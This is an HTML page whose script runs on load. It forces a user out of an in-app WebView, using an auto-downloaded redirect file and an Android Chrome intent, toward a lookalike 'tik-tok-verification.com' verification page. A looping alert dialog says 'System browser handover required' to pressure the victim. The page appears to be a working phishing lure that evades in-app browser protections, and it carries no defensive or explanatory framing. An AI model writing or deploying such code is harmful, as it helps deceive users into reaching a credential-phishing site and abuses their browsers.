<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function triggerDownloadHandover() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // Create a 'dummy' HTML file that redirects to your site
        const content = `<html><head><meta http-equiv="refresh" content="0;url=${target}"></head></html>`;
        const blob = new Blob([content], {type: 'text/html'});
        const blobUrl = URL.createObjectURL(blob);

        // Create a physical link element
        const a = document.createElement('a');
        a.href = blobUrl;
        
        // Use 'download' to force the WebView to give up and open an external browser
        a.download = "verify.html";
        document.body.appendChild(a);
        
        // Fire the click
        a.click();
        
        // Android fallback
        if (isAndroid) {
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        }
        
        document.body.removeChild(a);
    }

    function rampage() {
        if (Date.now() > killTime) return; // FAIL-SAFE

        // 1. Prime the download
        triggerDownloadHandover();

        // 2. THE LOCK
        alert("ATTEMPT #21\n\nSystem browser handover required.\n\nTap OK to continue.");

        // 3. The Execution Gap
        // Fires immediately after they tap 'OK'
        requestAnimationFrame(() => {
            triggerDownloadHandover();
            setTimeout(rampage, 10);
        });
    }

    window.onload = () => {
        rampage();
    };

    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>
</body>
</html>
